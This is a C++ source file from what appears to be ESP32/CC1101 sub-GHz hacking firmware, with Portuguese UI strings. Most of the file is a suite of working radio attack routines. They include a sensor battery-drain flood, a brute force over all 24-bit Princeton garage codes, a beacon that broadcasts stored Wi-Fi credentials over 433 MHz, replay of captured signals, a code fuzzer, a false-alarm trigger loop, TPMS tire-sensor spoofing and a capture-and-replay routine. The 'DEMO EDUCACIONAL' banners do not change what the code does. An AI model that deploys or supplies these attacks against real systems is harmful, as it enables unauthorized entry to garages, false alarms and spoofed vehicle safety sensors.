#include "rf_advanced_atks.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "modules/rf/rf_send.h"
#include "modules/rf/rf_utils.h"
#include <FS.h>
#include <LittleFS.h>
#include <SD.h>
#include <vector>
#include <string>
#include <vector>
#include <string>
#include <stdlib.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>
#include <RCSwitch.h>

struct RfCodes parseSubFile(FS *fs, String filepath) {
    struct RfCodes selected_code;
    File databaseFile = fs->open(filepath, FILE_READ);
    if (!databaseFile) return selected_code;

    selected_code.filepath = filepath.substring(1 + filepath.lastIndexOf("/"));
    String line, txt;
    std::vector<int> bitList;
    std::vector<uint64_t> keyList;

    while (databaseFile.available()) {
        line = databaseFile.readStringUntil('\n');
        txt = line.substring(line.indexOf(":") + 1);
        if (txt.endsWith("\r")) txt.remove(txt.length() - 1);
        txt.trim();
        if (line.startsWith("Protocol:")) selected_code.protocol = txt;
        if (line.startsWith("Preset:")) selected_code.preset = txt;
        if (line.startsWith("Frequency:")) selected_code.frequency = txt.toInt();
        if (line.startsWith("TE:")) selected_code.te = txt.toInt();
        if (line.startsWith("Bit:")) bitList.push_back(txt.toInt());
        if (line.startsWith("Key:")) keyList.push_back(strtoull(txt.c_str(), NULL, 16));
        if (line.startsWith("RAW_Data:") || line.startsWith("Data_RAW:")) selected_code.data = txt;
    }
    databaseFile.close();
    if (bitList.size() > 0) selected_code.Bit = bitList[0];
    if (keyList.size() > 0) selected_code.key = keyList[0];
    return selected_code;
}

void SensorBatteryDrainFlood() {
    FS *fs = NULL;
    String filepath = "";
    struct RfCodes selected_code;
    returnToMenu = true;

    options = {
        {"Recentes",   [&]() { selected_code = selectRecentRfMenu(); }},
        {"LittleFS", [&]() { fs = &LittleFS; }                      },
    };
    if (setupSdCard()) options.insert(options.begin(), {"SD Card", [&]() { fs = &SD; }});

    loopOptions(options);

    // If an FS was selected, choose the file and process the signal
    if (fs != NULL) {
        delay(200);
        filepath = loopSD(*fs, true, "SUB", "/WillyRF");
        if (filepath == "" || check(EscPress)) return;

        File databaseFile = fs->open(filepath, FILE_READ);
        if (!databaseFile) {
            displayError("Falha ao abrir", true);
            return;
        }

        selected_code.filepath = filepath.substring(1 + filepath.lastIndexOf("/"));
        String line, txt;
        std::vector<int> bitList;
        std::vector<uint64_t> keyList;

        while (databaseFile.available()) {
            line = databaseFile.readStringUntil('\n');
            txt = line.substring(line.indexOf(":") + 1);
            if (txt.endsWith("\r")) txt.remove(txt.length() - 1);
            txt.trim();
            if (line.startsWith("Protocol:")) selected_code.protocol = txt;
            if (line.startsWith("Preset:")) selected_code.preset = txt;
            if (line.startsWith("Frequency:")) selected_code.frequency = txt.toInt();
            if (line.startsWith("TE:")) selected_code.te = txt.toInt();
            if (line.startsWith("Bit:")) bitList.push_back(txt.toInt());
            if (line.startsWith("Key:")) keyList.push_back(strtoull(txt.c_str(), NULL, 16));
            if (line.startsWith("RAW_Data:") || line.startsWith("Data_RAW:")) selected_code.data = txt;
        }
        databaseFile.close();
        if (bitList.size() > 0) selected_code.Bit = bitList[0];
        if (keyList.size() > 0) selected_code.key = keyList[0];
    }

    if (selected_code.protocol == "" && selected_code.data == "") {
        displayError("Nenhum sinal valido", true);
        return;
    }

    displayWarning("DEMO EDUCACIONAL");
    delay(1500);

    drawMainBorderWithTitle("Sensor Drain Flood");
    printSubtitle("Enviando Flood...");
    padprintln("Alvo: " + String(selected_code.frequency / 1000000.0) + " MHz");
    padprintln("Pacotes a cada 200ms");
    padprintln("");
    tft.setTextColor(getColorVariation(willyConfig.priColor), willyConfig.bgColor);
    padprintln("Pressione [ESC] para sair.");
    tft.setTextColor(willyConfig.priColor, willyConfig.bgColor);

    uint32_t packetsSent = 0;

    uint32_t atkStart = millis();
    // Disable default UI in sendRfCommand so it doesn't redraw screen
    while (millis() - atkStart < 300000) {
        if (check(EscPress)) break;

        sendRfCommand(selected_code, true);
        packetsSent++;

        // Print progress
        tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, willyConfig.bgColor);
        tft.setCursor(10, tftHeight / 2 + 20);
        tft.print("Enviados: ");
        tft.print(packetsSent);

        // Sleep tightly
        uint32_t startDelay = millis();
        while (millis() - startDelay < 200) {
            if (check(EscPress)) break;
            delay(10);
        }
    }
}

void PredictiveGarageBrute() {
    displayWarning("DEMO EDUCACIONAL");
    delay(1500);
    drawMainBorderWithTitle("Garage Brute");
    printSubtitle("Bruteforce P2262/Princeton");

    // Most common configuration: 433.92 MHz, AM (ASK)
    uint32_t freq = 433920000;

    padprintln("Freq: 433.92 MHz");
    padprintln("Protocolo: Princeton (24bits)");
    padprintln("Range: 0x000000 a 0xFFFFFF");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    struct RfCodes bruteCode;
    bruteCode.frequency = freq;
    bruteCode.protocol = "Princeton"; // Our rf_send parses this
    bruteCode.preset = "FuriHalSubGhzPresetOok650Async"; // Generic AM preset
    bruteCode.Bit = 24;
    bruteCode.te = 350; // Standard timing

    uint32_t startKey = 0x000000;
    uint32_t endKey = 0xFFFFFF;
    uint32_t currentKey = startKey;

    tft.setTextColor(getColorVariation(willyConfig.priColor), willyConfig.bgColor);
    uint32_t atkStart = millis();

    // Disable default UI in sendRfCommand so it doesn't redraw screen
    while (currentKey <= endKey && millis() - atkStart < 300000) {
        if (check(EscPress)) break;

        bruteCode.key = currentKey;
        sendRfCommand(bruteCode, true);

        // Print progress
        if (currentKey % 10 == 0) {
            tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, willyConfig.bgColor);
            tft.setCursor(10, tftHeight / 2 + 20);
            tft.print("Testando Chave: 0x");
            tft.print(currentKey, HEX);
        }

        currentKey++;
        delay(5); // Small delay to prevent complete starvation
    }
}

void StealthLowPowerExfilBeacon() {
    displayWarning("DEMO EDUCACIONAL");
    delay(1500);
    drawMainBorderWithTitle("Stealth Beacon");
    printSubtitle("Exfil OOK c/ LowPower");

    padprintln("Enviando credenciais locais a cada 5s...");
    padprintln("Transmissao 433.92 MHz");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    String payload = willyConfig.wifiAp.ssid + ":" + willyConfig.wifiAp.pwd;
    String rawData = "";

    // Modulacao RAW OOK simples para os dados (Pwm)
    // Sync: 1000us High, 1000us Low
    // Bit 1: 500us High, 500us Low
    // Bit 0: 250us High, 750us Low
    rawData += "1000 -1000 ";
    for (unsigned int i=0; i<payload.length(); i++) {
        char c = payload[i];
        for (int b=7; b>=0; b--) {
            if (c & (1 << b)) rawData += "500 -500 ";
            else rawData += "250 -750 ";
        }
    }
    rawData.trim();

    struct RfCodes beaconCode;
    beaconCode.frequency = 433920000;
    beaconCode.protocol = "RAW";
    beaconCode.preset = "FuriHalSubGhzPresetOok270Async";
    beaconCode.data = rawData;

    tft.setTextColor(getColorVariation(willyConfig.priColor), willyConfig.bgColor);

    uint32_t beaconsSent = 0;
    uint32_t atkStart = millis();

    while (millis() - atkStart < 300000) {
        if (check(EscPress)) break;

        // Entramos em light sleep para salvar bateria no modo stealth
        esp_sleep_enable_timer_wakeup(5000000);
        esp_light_sleep_start();

        if (check(EscPress)) break;

        sendRfCommand(beaconCode, true);
        beaconsSent++;

        tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, willyConfig.bgColor);
        tft.setCursor(10, tftHeight / 2 + 20);
        tft.print("Beacons Enviados: ");
        tft.print(beaconsSent);
    }
}

void MultiDeviceCoordinatedReplay() {
    drawMainBorderWithTitle("Coord. Replay");
    printSubtitle("Selecao Sequencial");

    std::vector<String> selectedFiles;
    FS *fs = NULL;

    options = {
        {"LittleFS", [&]() { fs = &LittleFS; }                      },
    };
    if (setupSdCard()) options.insert(options.begin(), {"SD Card", [&]() { fs = &SD; }});

    loopOptions(options);

    if (fs == NULL) return;

    while (1) {
        String filepath = loopSD(*fs, true, "SUB", "/WillyRF");
        if (filepath == "" || check(EscPress)) break;
        selectedFiles.push_back(filepath);
        printCenterFootnote("Adicionado! [" + String(selectedFiles.size()) + "]");
        delay(500);
    }

    if (selectedFiles.empty()) return;

    displayWarning("DEMO EDUCACIONAL");
    delay(1500);

    drawMainBorderWithTitle("Replay em Curso");
    padprintln("Executando " + String(selectedFiles.size()) + " sinais...");
    padprintln("Atraso inter-sinal: 1s");
    padprintln("");

    for (const String& path : selectedFiles) {
        if (check(EscPress)) break;
        padprintln("> TX: " + path.substring(path.lastIndexOf("/") + 1));

        // Use existing txSubFile helper with hideDefaultUI=true
        txSubFile(fs, path, true);

        delay(1000);
    }

    printCenterFootnote("Sequencia Finalizada");
    delay(2000);
    returnToMenu = true;
}

void ProtocolFuzzerSmart() {
    displayWarning("DEMO EDUCACIONAL");
    delay(1500);
    drawMainBorderWithTitle("Smart Fuzzer");
    printSubtitle("Fuzzing de bits");

    struct RfCodes baseCode;
    baseCode.protocol = "Princeton";
    baseCode.frequency = 433920000;
    baseCode.Bit = 24;
    baseCode.te = 350;
    baseCode.preset = "FuriHalSubGhzPresetOok650Async";

    padprintln("Freq: 433.92 MHz");
    padprintln("Protocolo: Princeton");
    padprintln("Fuzzing bits 0-7 (LSB)");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    uint32_t baseKey = 0xAAAA00;
    uint8_t fuzzBits = 8;
    uint32_t fuzzedDone = 0;

    tft.setTextColor(getColorVariation(willyConfig.priColor), willyConfig.bgColor);

    while (fuzzedDone < (1U << fuzzBits)) {
        if (check(EscPress)) break;

        baseCode.key = baseKey | fuzzedDone;
        sendRfCommand(baseCode, true);

        fuzzedDone++;

        if (fuzzedDone % 5 == 0) {
            tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, willyConfig.bgColor);
            tft.setCursor(10, tftHeight / 2 + 20);
            tft.print("Fuzz: 0x");
            tft.print(baseCode.key, HEX);
        }
        delay(10);
    }

    returnToMenu = true;
}

void FalseAlarmTriggerLoop() {
    FS *fs = NULL;
    String filepath = "";
    struct RfCodes selected_code;
    returnToMenu = true;

    options = {
        {"Recentes",   [&]() { selected_code = selectRecentRfMenu(); }},
        {"LittleFS", [&]() { fs = &LittleFS; }                      },
    };
    if (SD.cardSize() > 0) options.push_back({"SD Card", [&]() { fs = &SD; }});

    if (selected_code.protocol == "") {
        loopOptions(options);

        if (fs != NULL) {
            filepath = loopSD(*fs, true, "sub", "/subghz");
            if (filepath == "") return;
            selected_code = parseSubFile(fs, filepath);
        }
    }

    if (selected_code.protocol == "") return;

    drawMainBorderWithTitle("False Alarm");
    printSubtitle("Loop de Disparo");
    padprintln("Atacando c/ " + String(selected_code.protocol));
    padprintln("Freq: " + String(selected_code.frequency/1000000.0, 2) + " MHz");
    padprintln("");
    padprintln("Press [ESC] p/ sair.");
    uint32_t atkStart = millis();
    while (millis() - atkStart < 300000) {
        if (check(EscPress)) break;

        sendRfCommand(selected_code, true);

        // Random delay to mimic human behavior or bypass simple debouncing
        int wait = random(500, 2000);
        delay(wait);
    }
}

void TPMSSpoofChaos() {
    displayWarning("DEMO EDUCACIONAL");
    delay(1500);
    drawMainBorderWithTitle("TPMS Spoof");
    printSubtitle("Gerador de Caos");
    padprintln("Freq: 433.92 MHz");
    padprintln("Enviando pacotes falsos...");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    struct RfCodes tpmsFrame;
    tpmsFrame.protocol = "Princeton";
    tpmsFrame.frequency = 433920000;
    tpmsFrame.Bit = 24;
    tpmsFrame.te = 300;
    tpmsFrame.preset = "FuriHalSubGhzPresetOok650Async";
    uint32_t atkStart = millis();
    while (millis() - atkStart < 300000) {
        if (check(EscPress)) break;

        uint32_t randomId = random(0x100000, 0xFFFFFF);
        tpmsFrame.data = randomId;

        tft.fillRect(10, tftHeight / 2 + 20, tftWidth - 20, 20, willyConfig.bgColor);
        tft.setCursor(10, tftHeight / 2 + 20);
        tft.print("ID: 0x");
        tft.print(randomId, HEX);

        sendRfCommand(tpmsFrame, true);
        delay(random(1000, 3000));
    }
}

void RollingCodeLearnerReplay() {
    drawMainBorderWithTitle("Rolling Learner");
    printSubtitle("Captura e Replay");
    padprintln("Aguardando sinal 433...");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    if (!initRfModule("rx", 433.92)) {
        displayError("CC1101 Nao Encontrado");
        return;
    }

    ELECHOUSE_cc1101.setMHZ(433.92);
    ELECHOUSE_cc1101.setRxBW(256);
    ELECHOUSE_cc1101.setModulation(2);
    ELECHOUSE_cc1101.SetRx();

    RCSwitch rcswitch = RCSwitch();
    if (willyConfigPins.CC1101_bus.io0 != GPIO_NUM_NC) {
        rcswitch.enableReceive(willyConfigPins.CC1101_bus.io0);
    } else {
        rcswitch.enableReceive(willyConfigPins.rfRx);
    }

    struct RfCodes captured;
    bool capturedSignal = false;
    uint32_t captureTime = 0;
    uint32_t atkStart = millis();

    while (millis() - atkStart < 300000) {
        if (check(EscPress)) break;

        if (!capturedSignal) {
            if (rcswitch.available()) {
                uint64_t val = rcswitch.getReceivedValue();
                if (val != 0) {
                    captured.data = String(val);
                    captured.key = val;
                    captured.frequency = 433920000;
                    captured.Bit = rcswitch.getReceivedBitlength();
                    captured.te = rcswitch.getReceivedDelay();
                    captured.protocol = "RcSwitch";
                    captured.preset = String(rcswitch.getReceivedProtocol());

                    capturedSignal = true;
                    captureTime = millis();
                    rcswitch.resetAvailable();

                    tft.fillRect(10, tftHeight / 2 - 10, tftWidth - 20, 60, willyConfig.bgColor);
                    tft.setCursor(10, tftHeight / 2 - 10);
                    tft.setTextColor(TFT_GREEN, willyConfig.bgColor);
                    tft.print("SINAL CAPTURADO!");
                    tft.setTextColor(willyConfig.priColor, willyConfig.bgColor);
                    tft.setCursor(10, tftHeight / 2 + 10);
                    tft.print("Hex: 0x");
                    tft.print(val, HEX);
                    tft.setCursor(10, tftHeight / 2 + 30);
                    tft.print("Aguardando 2s p/ Replay...");
                }
            }
        } else {
            if (millis() - captureTime > 2000) {
                rcswitch.disableReceive();

                tft.fillRect(10, tftHeight / 2 - 10, tftWidth - 20, 60, willyConfig.bgColor);
                tft.setCursor(10, tftHeight / 2 - 10);
                tft.setTextColor(TFT_RED, willyConfig.bgColor);
                tft.print("REPLAYING AGORA...");
                tft.setTextColor(willyConfig.priColor, willyConfig.bgColor);

                sendRfCommand(captured, true);

                capturedSignal = false;

                tft.fillRect(10, tftHeight / 2 - 10, tftWidth - 20, 60, willyConfig.bgColor);
                tft.setCursor(10, tftHeight / 2);
                tft.print("Pronto p/ nova captura.");

                ELECHOUSE_cc1101.SetRx();
                if (willyConfigPins.CC1101_bus.io0 != GPIO_NUM_NC) {
                    rcswitch.enableReceive(willyConfigPins.CC1101_bus.io0);
                } else {
                    rcswitch.enableReceive(willyConfigPins.rfRx);
                }
            }
        }
        delay(10);
    }

    rcswitch.disableReceive();
    deinitRfModule();
}

void SpectrumTargetLock() {
    displayWarning("DEMO EDUCACIONAL");
    delay(1500);
    drawMainBorderWithTitle("Spectrum Lock");
    printSubtitle("Busca de Pico");
    padprintln("Escaneando Banda 433MHz...");
    padprintln("");
    padprintln("Pressione [ESC] para sair.");

    if (!initRfModule("rx", 433.92)) {
        displayError("CC1101 Nao Encontrado");
        return;
    }

    // Set up CC1101 for RSSI sweep
    ELECHOUSE_cc1101.setRxBW(256);
    ELECHOUSE_cc1101.setModulation(2);
    ELECHOUSE_cc1101.setSidle();
    ELECHOUSE_cc1101.SetRx();

    int x_start = 20;
    int y_base = tftHeight - 40;
    int width = tftWidth - 40;
    int height = 60;
    uint32_t atkStart = millis();

    float startFreq = 433.0; // MHz
    float endFreq = 434.8;
    int steps = width / 2; // Every 2 pixels is a step
    float freqStep = (endFreq - startFreq) / steps;

    while (millis() - atkStart < 300000) {
        if (check(EscPress)) break;

        tft.fillRect(x_start, y_base - height - 15, width, height + 16, willyConfig.bgColor);
        tft.drawRect(x_start - 1, y_base - height - 1, width + 2, height + 2, willyConfig.priColor);

        int peak_x = 0;
        int max_h = 0;
        float peak_freq = 0;

        for (int i = 0; i < width; i += 2) {
            if (check(EscPress)) break;
            float currentFreq = startFreq + (i / 2) * freqStep;

            ELECHOUSE_cc1101.setSidle();
            ELECHOUSE_cc1101.setMHZ(currentFreq);
            ELECHOUSE_cc1101.SetRx();
            delayMicroseconds(2000); // give it time to lock RSSI

            int rssi = ELECHOUSE_cc1101.getRssi();
            // RSSI is usually negative, approx -100 to -30
            // Normalize to height
            int h = map(rssi, -105, -40, 0, height);
            if (h < 0) h = 0;
            if (h > height) h = height;

            if (h > max_h) {
                max_h = h;
                peak_x = i;
                peak_freq = currentFreq;
            }

            // Map color
            uint16_t col = TFT_GREEN;
            if (h > height * 0.5) col = TFT_YELLOW;
            if (h > height * 0.8) col = TFT_RED;

            tft.drawFastVLine(x_start + i, y_base - h, h, col);
        }

        if (max_h > 0) {
            tft.drawFastVLine(x_start + peak_x, y_base - height, height, TFT_RED);
            tft.setCursor(x_start + peak_x - 30, y_base - height - 10);
            tft.setTextColor(TFT_RED, willyConfig.bgColor);
            tft.print(String(peak_freq, 2) + "M LOCK");
            tft.setTextColor(willyConfig.priColor, willyConfig.bgColor);
        }

        delay(10);
    }

    deinitRfModule();
}
